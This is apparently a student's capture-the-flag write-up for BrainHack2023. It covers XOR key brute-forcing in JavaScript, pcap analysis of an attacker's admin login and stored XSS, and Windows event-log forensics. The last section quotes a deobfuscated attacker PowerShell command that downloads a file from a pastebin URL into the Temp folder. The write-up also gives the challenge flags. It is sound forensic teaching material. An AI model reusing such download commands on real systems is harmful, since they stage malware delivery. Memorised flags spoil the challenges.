# BrainHack2023 Write-Up
This is my writeup for BrainHack2023. I competed in the ITE/Poly division with the team 'TRUEIMMORTAL' and managed to reached the finals. Overall, BrainHack2023 was decently fun and allowed me to improve my foundation in both network analysis and log analysis. **All challenge files can be found in the 'assets' folder.**

## Table Of Contents
- [The Key](#the-key)
- [What happened to the PC!?](#what-happened-to-the-pc)
- [Eventlog Digging Fun](#eventlog-digging-fun) 

## The Key
The encoded flag was provided to us in encode.js, which contained the source code used to originally encode the flag. Thus, our goal is to reverse engineer the JavaScript source code provided.
```
/**
 * Convert charCode array to hex string
 * @param   {array}  target - A target text(charCode array)
 * @returns {string}        - A hex string
 */
function CharCodeArrToHexString(target) {
    let result = "";

    target.forEach(charCode => {
        result += ("00" + charCode.toString(0x10)).slice(-2);
    });

    return result;
}

/**
 * Xor plain using key
 * @param   {array} plain - A plain text(charCode array)
 * @param   {array} key   - A key text(charCode array)
 * @returns {array}       - A encoded text(charCode array)
 */
function xor(plain, key) {
    let encoded = [];

    for (let i = 0; i < plain.length; i++)
        encoded.push(plain[i] ^ key[i % key.length]);

    return encoded;
}

/**
 * Generate random key
 * @param   {int}    keyLen - A length of key
 * @returns {string}        - A key
 */
function generateKey(keyLen) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let charsLen = chars.length;

    let key = "";

    for (let i = 0; i < keyLen; i++)
        key += chars.charAt(Math.floor(Math.random() * charsLen));

    return key;
}

/**
 * Convert string to charCode(int) array
 * @param   {string} target - A string value
 * @returns {array}         - A charCode array
 */
function stringToCharCodeArr(target) {
    let arr = [];

    for (let i = 0; i < target.length; i++)
        arr.push(target.charCodeAt(i));

    return arr;
}

/**
 * Encode plain text
 * @param   {string} plain  - A plain text
 * @param   {int}    keylen - A length of key
 * @returns {string}        - A encoded text
 */
function encode(plain, keyLen) {
    let key = generateKey(keyLen);

    let plainArr = stringToCharCodeArr(plain);
    let keyArr = stringToCharCodeArr(key);

    encodedArr = xor(plainArr, keyArr);

    return CharCodeArrToHexString(encodedArr);
}

window.onload = () => {
    const flag = /* "CDDC2023{...}" */ "";
    let encodedFlag = /* encode(flag, 5) */ "017d212b5b720b561301726e3a04060c5e3a0c5826660c5f3636780e5b14";

    let flagElem = document.getElementById("flag");
    flagElem.innerText = "Encoded flag is " + encodedFlag;
}
```
1. As shown above, the flag was:
	1.1. Converted into a Character Code/Unicode Array
	1.2. Encrypted using XOR against a randomly generated 5-character key 
	1.3. Converted to hexadecimal
2. Thus, the first thing we will do is convert the encoded flag back to a Character Code/Unicode Array. 
Secondly, we XOR the output acquired from step 1 with a randomly generated key.
Thirdly, we will convert the output from step 2 back to a string. 
Lastly, we will check if the substring 'CDDC2023{' exists inside the output from step 3. Hence, we are essentially reversing all the steps taken to encode the flag and brute forcing the randomly generated key to get the original flag.
3. This are the functions used to decode the flag. Copy all the functions in encode.js to a new file, and add the functions below. Lastly, create a copy of the html file provided, edit the parameters, and execute the file and wait for the brute-force process to finish.
```
function hexStringtoCharCodeArr(hexString){
	const charCodeArr = [];

	for (let i = 0; i < hexString.length; i += 2){
    const hexCode = hexString.substr(i, 2);
    const charCode = parseInt(hexCode, 16);
    charCodeArr.push(charCode);
	}
	return charCodeArr;
}

function charCodeArrToString(charCodeArr) {
  let str = "";

  for (let i = 0; i < charCodeArr.length; i++) {
    const char = String.fromCharCode(charCodeArr[i]);
    str += char;
  }

  return str;
}

function decode(encodedFlag,keyLen) {
	
	while(true){
		let key = generateKey(keyLen);
		let ogCharCodeArr = hexStringtoCharCodeArr(encodedFlag);
		let keyArr = stringToCharCodeArr(key);

		decodedArr = xor(ogCharCodeArr, keyArr);
		decodedString = charCodeArrToString(decodedArr);
		if(decodedString.includes("CDDC2023{")){
			return decodedString;
			print("key")
			break;
		}
	}
}

window.onload = () => {
	let encodedFlag = "017d212b5b720b561301726e3a04060c5e3a0c5826660c5f3636780e5b14";
    const flag = decode(encodedFlag,5);

    let flagElem = document.getElementById("flag");
    flagElem.innerText = "decoded flag is " + flag;
}
```
4. Once we successfully brute-forced the key, we are provided with the flag.
![Image of decoded flag](/assets/image1.png) 

## What happened to the PC!?
We were told that a PC has been compromised, and that we have to find the date and time of which a malicious action happened with the pcap file provided.
1. I did a rough search on HTTP requests before looking elsewhere, such as HTTPS requests, as I did not believe that the question would be found in the HTTP requests as that would be too easy.
2. As I was unable to find anything after quite some time, I decided to analyse the HTTP requests once again. Upon following the HTTP stream, I discovered login requests with the administrator account of the 'sbadmin' webpage, albeit unsuccessful, were made. 
3. This means that the attacker was potentially trying to access the webpage as an administrator after gaining an initial foothold into the system. Hence, I went through each POST request made to '/sbadmin/act/login.php'
![Image of http traffic](/assets/image2.png) 
![Image of POST login request](/assets/image3.png) 
4. After going through multiple HTTP streams, we eventually stumble accross a HTTP request where the attacker successfully logins and creates a stored XSS payload on a 'freeboard' page, suggesting that the XSS payload was the successful attack made. 
![Image of successful login request](/assets/image4.png) 
5. Take the date of the request found in the stream in YYYYMMDD-HH:MM:SS. As the infected machine is located in korea, we will add 9 hours to UTC+0 for korea time (20230503-05:16:35) and md5 the formatted date string for the flag, CDDC2023{d6f34555596e3917d42933f66be58cd8}.

## Eventlog Digging Fun
We were provided with a large number of Windows event logs (.evtx files) and told to find:
PID and VID of attacker's cellphone
timestamp (UTC + 0) of when Windows Defender was disabled
timestamp (UTC + 0) of when a file was excluded from Windows Defender's scans
A suspicious string found when investigating the steps taken by the attacker to disable Windows Defender 

1. The PID and VID can be found in multiple event log files such as 'Microsoft-Windows-DeviceSetupManager%4Admin.evtx' and 'Microsoft-Windows-Kernel-PNP%4Configuration.evtx'
![Image of DeviceSetupManager](/assets/image5.png) 
![Image of Kernel Configuration](/assets/image6.png) 
2. The datetime of Windows Defender being disabled is found in 'Microsoft-Windows-Windows Defender%4Operational.evtx'. **Since Microsoft Event Logs convert the time of the logs into local time, UTC+8 for Singapore, we will deduct 8 hours from the timestamp to get the desired timestamp.** (230503-18:20:59)
![Image of Windows Defender being disabled](/assets/image7.png) 
3. The datetime of a file being excluded can also be found in 'Microsoft-Windows-Windows Defender%4Operational.evtx'.
![Image of C: drive being excluded from Windows Defender scans](/assets/image8.png) 
4. Lastly, the suspicious string can be found after searching through all event log files of relevance. We eventually discover an obfuscated PowerShell Script in 'Windows PowerShell.evtx' which contains the desired suspicious string. 
5. As I have little experience with deobfuscating PowerShell scripts, I decided to undergo Dynamic Analysis. I ran the script in my FlareVM sandbox and captured the event with Process Monitor. The deobfuscated command comes out to be **"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "$file_name = "0bfu5c@t3_p0w3r5he1l_5cr1pt"; $url = "https://pastebin.com/raw/SeJF9Edn"; Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $env:Temp$file_name;"**. As shown in the command above, the suspicious string is '0bfu5c@t3_p0w3r5he1l_5cr1pt' and the pastebin links to the text 'This is malware file!!'.
![Image of obfuscated script](/assets/image9.png)
![Image of deobfuscated script](/assets/image10.png)
6. Lastly, md5 hash the information found in the format 'VIDPID_YYMMDD-HH:MM:SS_YYMMDD-HH:MM:SS_found character string',04E86860_230503-18:20:59_230503-18:21:19_0bfu5c@t3_p0w3r5he1l_5cr1pt, to get the flag. CDDC2023{11b77c51a25ea2c0ead3a3efd6493a62}